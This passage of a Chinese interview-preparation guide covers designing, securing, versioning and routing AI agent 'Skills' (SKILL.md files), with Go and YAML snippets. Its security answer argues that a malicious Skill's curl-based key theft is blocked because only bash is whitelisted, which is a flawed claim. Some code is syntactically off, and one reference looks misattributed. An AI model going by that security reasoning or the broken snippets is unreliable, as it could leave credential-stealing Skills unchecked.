3. 性能检查 → 报告发现的问题
4. 综合建议 → 给出改进方案`
```
```

**追问准备**：
- 什么时候不该用 CoT？（简单任务、实时性要求高）
- Zero-shot CoT vs Few-shot CoT 的区别？

---

### 问题 3：如何设计一个高质量的 SKILL.md？

**问题解析**：
考察实际工程能力，从「会用」到「会设计」的进阶。

**回答框架**：

```
高质量 SKILL.md 的设计原则：

1. Frontmatter 完整性
```yaml
name: skill-name              # 必填，kebab-case
description: 一句话描述       # 必填，< 200 字符
version: "1.0.0"              # 必填，SemVer
triggers:                     # 必填，用户如何触发
  - "触发词1"
  - "触发词2"
allowed-tools:                # 必填，Skill 能用什么 Tool
  - read_file
  - bash
tags: []                      # 可选，分类标签
```

2. 渐进式披露
- L1 (SKILL.md)：核心指令 < 5000 tokens
- L2 (doctrines/)：领域规则，按需加载
- L3 (references/)：大文档，显式引用加载

3. 触发词设计
```yaml
triggers:
  # 直接匹配
  - "代码审查"
  # 同义词覆盖
  - "审查代码"
  - "检查bug"
  # 英文支持
  - "review code"
```

4. CoT 结构化指令
```markdown
## 任务执行

### Step 1: 收集信息
- 读取相关源文件
- 理解上下文

### Step 2: 分析
- 检查正确性
- 检查安全性
- 检查性能

### Step 3: 报告
- 汇总发现
- 按严重程度排序
- 提供修复建议
```

5. 错误处理
```markdown
## 错误处理

### 文件不存在
→ 报告错误，询问用户确认路径

### 权限不足
→ 报告错误，建议检查权限

### 超时
→ 返回已完成的分析，标记未完成部分
```
```

**追问准备**：
- 如何测试 SKILL.md 的质量？（人工评审 + 自动化测试）
- Skill 版本如何管理？（SemVer + Changelog）

---

### 问题 4：渐进式披露架构解决了什么问题？

**问题解析**：
考察对上下文窗口限制的深刻理解。

**回答框架**：

```
解决的问题：上下文窗口的有限性与信息需求的无限性之间的矛盾

三个具体问题：

1. 中间丢失效应
LLM 对长上下文中段的信息召回率低。
渐进式披露确保 L1 信息始终在「首尾位置」，
不会被大量内容稀释。

2. 成本控制
每个 token 都有成本。
L1 < 5K tokens 是「必要成本」，
L2/L3 按需加载是「边际成本」。

3. 上下文污染
加载不需要的信息会「污染」上下文，
影响 LLM 对相关信息的注意力。
按需加载避免污染。

量化分析：
- 假设有 20 个 Skill，平均每个 10K tokens
- 全量加载：200K tokens → 成本高、中间丢失严重
- 渐进加载：L1 50K + 按需 L2/L3 20K → 最优

三层职责：
L1：快速判断（是否激活 Skill）
L2：执行指导（如何执行）
L3：参考信息（需要时查阅）
```

**追问准备**：
- L1 的 token 预算如何设定？（经验值 < 5000）
- L2/L3 的加载时机如何确定？（显式引用 + 上下文推断）

---

### 问题 5：Skill 的安全性如何保障？

**问题解析**：
考察对 AI 安全性的理解，这在 AI Agent 开发中是必备知识。

**回答框架**：

```
多层安全防护体系：

1. 零执行完整性（Skill 内容是数据，不是代码）
```go
// 只能执行白名单中的 Tool
allowed-tools:
  - read_file  # 受限范围
  - bash       # 限制命令
```
没有白名单 Tool = 不能执行任何操作。

2. Merkle 哈希验证（内容不被篡改）
- 发布时计算 Merkle 树
- 安装时验证每个文件的哈希
- 任何篡改都会被检测

3. Pre-commit Hook 强制检查
- Token 预算（防止资源耗尽）
- 引用完整性（防止引用恶意资源）
- Frontmatter 完整性（防止遗漏安全字段）

4. 隔离性检查
- 检查是否有硬编码的 API Key
- 检查是否有硬编码的绝对路径
- 检查是否有可疑的网络请求

5. 版本锁定
- package-lock.json 锁定依赖版本
- 防止依赖链中的恶意更新

实际案例：
一个恶意的 Skill 试图窃取 API Key：
```yaml
allowed-tools:
  - bash
```
虽然 Skill 指令中有 `curl` 命令，
但 `curl` 不在 allowed-tools 中，
命令实际不会被执行。
```
```

**追问准备**：
- 如何防止 Prompt 注入攻击？（@ref: 标记的内容不被执行为指令）
- 如何审计已有的 Skill 依赖？（skill-audit 命令）

---

### 问题 6：如何做 Skill 的版本管理？

**问题解析**：
考察工程化能力，从「能写」到「能维护」。

**回答框架**：

```
SemVer 语义化版本 + 版本锁定

1. 版本号规范
```
MAJOR.MINOR.PATCH
^1.2.3 → 兼容 1.x.x
~1.2.3 → 兼容 1.2.x
>=1.0.0 <2.0.0 → 范围版本
```

2. 升级策略
```go
// 自动检测更新
func CheckUpdate(current, latest string) UpdateType {
    c := ParseSemVer(current)
    l := ParseSemVer(latest)
    
    if l.Major > c.Major {
        return UpdateMajor  // 需要人工确认
    }
    if l.Minor > c.Minor {
        return UpdateMinor  // 建议更新
    }
    return UpdatePatch  // 安全更新
}
```

3. 版本锁定
```yaml
# skill-lock.json
{
  "skill-name": {
    "version": "1.2.3",
    "resolved": "https://registry.example.com/skill-name@1.2.3",
    "hash": "sha256:abc123..."
  }
}
```

4. 升级流程
```
1. skill-check --outdated
2. 查看 changelog
3. 评估 breaking changes
4. 本地测试
5. 更新 skill-lock.json
6. 提交
```
```

**追问准备**：
- 如何回退到旧版本？（git revert + 删除 skill-lock.json）
- 如何测试 Skill 升级的影响？（沙盒环境测试）

---

### 问题 7：描述一下 Skill Governance 的完整流水线

**问题解析**：
考察对完整流程的理解，不是只了解单个工具。

**回答框架**：

```
Score → Improve → Verify → Keep or Revert → Repeat

1. Score（评分）
   - 多维度评估：correctness, completeness, efficiency, safety, maintainability
   - 每个维度有多个指标
   - 输出量化分数和改进建议

2. Improve（改进）
   - 基于评分结果生成改进
   - Native Thinking：母语逻辑 → AI 原生指令
   - Logic Elevation：普通指令 → CoT 结构

3. Verify（验证）
   - 自动化测试套件
   - 边界情况覆盖
   - 回归测试（确保改进不破坏现有功能）

4. Keep or Revert（决策）
   - 验证必须全部通过
   - 核心维度不能退化
   - 否则回退到上一版本

5. Repeat（迭代）
   - 循环直到分数收敛或达到退出条件
   - 退出条件：分数提升 < 阈值、迭代次数上限、时间限制

Karpathy 模式的应用：
快速迭代、边做边学、自动化验证、人工审核点

工具支持：
- skill-new：创建新 Skill
- skill-check：评分和改进
- skill-audit：审计和验证
- skill-new-suite：生成测试套件
```
```

**追问准备**：
- 流水线如何与 CI/CD 集成？（GitHub Actions）
- 如何处理流水线失败？（人工介入、通知）

---

### 问题 8：32 种 Agent 格式转换的技术挑战是什么？

**问题解析**：
考察跨平台生态的理解，这反映了候选人的视野广度。

**回答框架**：

```
三个核心挑战：

1. 语义等价转换
不同格式的表达能力不同：
- Claude Code：.md 格式，Frontmatter 简洁
- Cursor：.mdc 格式，支持 glob 模式
- Windsurf：.windsurfrules，支持 always_apply

转换时需要「语义抽象」：
- 提取核心意图
- 映射到目标格式的表达方式
- 可能损失某些特性

2. 功能特性不兼容
示例：Cursor 的 glob 模式
```yaml
globs:
  - "**/*.py"
```
Claude Code 没有等效功能，需要：
- 方案 A：在 SKILL.md 中添加条件判断
- 方案 B：放弃 glob，所有文件都生效

3. Tool 定义差异
```yaml
# Claude Code
tools: [Read, Bash]

# Cursor
tools:
  - Read: {description: "..."}
  - Bash: {command: "${command}"}
```
需要标准化抽象层。

解决方案：
- 标准化中间格式（NormalizedSkill）
- 格式注册表（FormatRegistry）
- 渐进支持（先支持主流 5 种）
```
```

**追问准备**：
- 如何保证转换质量？（测试用例 + 人工审核）
- 哪些格式最难转换？（有独特特性的格式）

---

### 问题 9：如何设计一个 Skill 注册发现机制？

**问题解析**：
考察系统设计能力，这是高级工程师必备。

**回答框架**：

```
三层架构：注册中心 → 索引 → 路由

1. 注册中心
```go
type Registry struct {
    skills map[string]*SkillMetadata
    mu     sync.RWMutex
}

type SkillMetadata struct {
    Name        string
    Version     string
    Path        string
    Triggers    []string
    Description string
    Tags        []string
    Score       float64  // 质量评分
}
```

2. 索引（支持快速搜索）
```go
type SkillIndex struct {
    embeddingModel EmbeddingModel
    vectorIndex    *FaissIndex  // 向量索引
    keywordIndex   *InvertedIndex
}

func (idx *SkillIndex) Search(query string, topK int) ([]*ScoredSkill, error) {
    // 1. 向量搜索（语义相似）
    vecResult, _ := idx.vectorIndex.Search(query, topK)
    
    // 2. 关键词搜索（精确匹配）
    kwResult, _ := idx.keywordIndex.Search(query)
    
    // 3. 融合排序
    return idx.rerank(vecResult, kwResult)
}
```

3. 路由（选择最佳匹配）
```go
type Router struct {
    index     *SkillIndex
    threshold float64
}

func (r *Router) Route(ctx context.Context, input string) (*Skill, error) {
    candidates, _ := r.index.Search(input, topK=5)
    
    // 过滤低于阈值的
    valid := filterByThreshold(candidates, r.threshold)
    
    // 选择最佳
    return selectBest(valid), nil
}
```

4. 缓存层（性能优化）
```go
type CachedRouter struct {
    router  *Router
    cache   *lru.Cache  // 查询缓存
    ttl     time.Duration
}
```
```

**追问准备**：
- 如何处理 Skill 冲突？（版本优先 + 明确提示）
- 如何支持多租户？（租户隔离 + 权限控制）

---

### 问题 10：作为 Go 后端开发者，如何转型 AI Agent 开发？

**问题解析**：
这道题考察自我认知和职业规划，需要结合自身背景。

**回答框架**：

```
Go 后端 → AI Agent 开发的技能映射：

1. 强项继承
├→ 系统设计能力 ✓
├→ 并发编程经验 ✓（Goroutine 模型有助于理解 Agent 并发）
├→ 微服务架构理解 ✓（Skill 编排类似微服务）
└→ API 设计经验 ✓（Skill 间的接口设计）

2. 新技能补充
├→ LLM API 使用（Prompt 工程）
├→ Tool/Agent 框架（LangChain、AgentScope）
├→ 向量数据库（Milvus、Pinecone）
└→ 嵌入式模型（Embedding、向量检索）

3. 转型路径建议
阶段 1（1-2月）：玩转现有 Agent 工具
- 用 Claude Code 辅助编码
- 用 Cursor 尝试 Skill 开发
- 理解 Agent 的思考方式

阶段 2（2-3月）：深度理解 Agent 架构
- 学习 Skill 设计原理
- 理解 CoT、Tool Use 等核心概念
- 尝试开发自己的 Skill

阶段 3（持续）：工程化实践
- 将 Skill 引入实际项目
- 构建 Skill 治理体系
- 探索 Agent 编排最佳实践

面试准备重点：
- Skill 设计（核心知识点）
- Agent 架构（理解 Agent 如何工作）
- Prompt 工程（实践技能）
- 系统设计（加分项：如何设计 Agent 系统）
```
```

---

## 附录

### A. 术语表

| 术语 | 英文 | 定义 |
|------|------|------|
| Skill | Skill | Agent 的能力单元，包含指令、策略、工具定义 |
| Tool | Tool | Agent 可调用的原子操作 |
| SKILL.md | SKILL.md | Skill 的标准定义文件格式 |
| CoT | Chain of Thought | 思维链，引导 LLM 展示推理过程 |
| Progressive Disclosure | 渐进式披露 | 按需加载 Skill 内容的分层架构 |
| Skill Governance | Skill 治理 | Skill 的质量管理实践 |
| Semantic Routing | 语义路由 | 基于语义相似度选择 Skill |

### B. 参考资源

- **Skill Refiner**：https://github.com/skills-refiner/skills-refiner
- **Skill Governance**：https://github.com/dtsong/skill-governance
- **SKILL.md 标准**：https://github.com/skills/skills
- **SkillKit**：https://skillkit.dev

### C. 延伸阅读建议

1. **Prompt 工程**：《Prompt Engineering Guide》（免费在线资源）
2. **Agent 架构**：微软《Building Effective Agents》
3. **CoT 研究**：Wei et al. 2022《Chain-of-Thought Prompting Elicits Reasoning in Large Language Models》
4. **渐进式加载**：LangChain 文档 - Retrieval 章节

---

**文档信息**：
- 版本：1.0
- 更新日期：2025年11月
- 目标读者：AI Agent 开发工程师求职者
- 适用面试：AI Agent 开发工程师、AI 平台工程师
